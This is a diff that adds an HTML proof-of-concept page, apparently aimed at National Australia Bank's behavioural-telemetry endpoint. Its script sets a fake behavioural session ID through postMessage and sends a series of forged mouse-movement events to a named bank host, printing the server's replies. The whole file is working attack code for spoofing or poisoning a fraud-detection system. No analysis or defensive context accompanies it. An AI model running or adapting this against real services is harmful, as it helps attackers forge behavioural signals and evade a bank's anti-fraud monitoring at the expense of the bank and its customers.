@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>NAB Telemetry Spoofer</title>
+</head>
+<body>
+  <h2>Simulating Mouse Movement Events to NAB's WUP Endpoint</h2>
+  <pre id="output">Sending spoofed behavioral data...</pre>
+
+  <script>
+    // Set fake behavioral session ID
+    window.postMessage({ type: "cdSetCsid", csid: "attacker-session-id-1337" }, "*");
+
+    let i = 0;
+    function sendFakeTelemetry() {
+      const payload = {
+        event: "mouse_move",
+        x: Math.floor(Math.random() * 800),
+        y: Math.floor(Math.random() * 600)
+      };
+
+      fetch("https://wup-24f7f3c7.nab.com.au/client/v3/web/wup?cid=nightcrawler", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById("output").textContent +=
+          `\n[${++i}] Spoofed: ${JSON.stringify(payload)}\n→ Server Response: ${JSON.stringify(data)}\n`;
+        if (i < 10) setTimeout(sendFakeTelemetry, 1000);
+      })
+      .catch(err => {
+        document.getElementById("output").textContent += `\n[${++i}] Error: ${err}`;
+      });
+    }
+
+    sendFakeTelemetry();
+  </script>
+</body>
+</html>
